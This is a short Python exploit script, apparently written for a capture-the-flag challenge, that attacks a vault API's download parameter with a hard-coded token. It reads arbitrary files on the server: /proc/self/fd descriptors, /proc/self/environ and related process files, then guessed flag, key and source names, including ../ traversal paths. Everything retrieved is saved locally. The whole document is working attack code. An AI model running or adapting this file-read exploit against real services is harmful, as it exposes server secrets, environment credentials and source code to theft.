#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, os, sys
TOK="PV6QKm8XtToPXK4G4u9uatWRX9GQlERnawgC31Uj5qb8KypnHVzPpNusmb84GdDvJZq"
B="http://challs.nusgreyhats.org:35667/api/vault"
OUT="dl"; os.makedirs(OUT, exist_ok=True)
rep=[]

def get(fname, save=None, t=10):
    url=f"{B}?download={urllib.parse.quote(fname)}&token={TOK}"
    try:
        r=urllib.request.urlopen(url, timeout=t)
        data=r.read(); code=r.status
    except urllib.error.HTTPError as e:
        return (e.code, b"", str(e))
    except Exception as e:
        return (-1, b"", str(e))
    if save and data:
        open(os.path.join(OUT,save),"wb").write(data)
    return (code, data, "")

# sanity
c,d,e=get("test.txt")
rep.append(f"SANITY test.txt -> {c} {len(d)}b {d[:20]!r} {e}")

# proc self fd 0..40
rep.append("== /proc/self/fd ==")
for n in range(0,41):
    c,d,e=get(f"/proc/self/fd/{n}", save=f"fd_{n}.bin")
    if c==200 and d:
        rep.append(f"fd {n}: {len(d)}b head={d[:48]!r}")
    elif c not in (404,-1,200):
        rep.append(f"fd {n}: code={c} {e}")

# proc self meta
rep.append("== /proc/self meta ==")
for p in ["/proc/self/cmdline","/proc/self/environ","/proc/self/maps","/proc/self/cwd","/proc/self/status","/proc/1/cmdline"]:
    c,d,e=get(p, save=os.path.basename(p)+".txt")
    rep.append(f"{p}: {c} {len(d)}b head={d[:120]!r}")

# guess filenames
rep.append("== guessed paths ==")
for p in ["flag","flag.txt","flag.enc","flag.enc.txt","encrypted","encrypted.bin","secret","secret.enc",
          "keyfile","keyfile.bin","key","key.bin","vault.key","app.py","server.py","main.py","index.js",
          "server.js","app.js","run.py","../flag","../flag.txt","../../flag","mem_dump.dmp"]:
    c,d,e=get(p, save="g_"+p.replace("/","_"))
    if c==200 and d:
        rep.append(f"{p}: 200 {len(d)}b head={d[:80]!r}")

open("report2.txt","w").write("\n".join(rep))
print("DONE", len(rep), "lines")
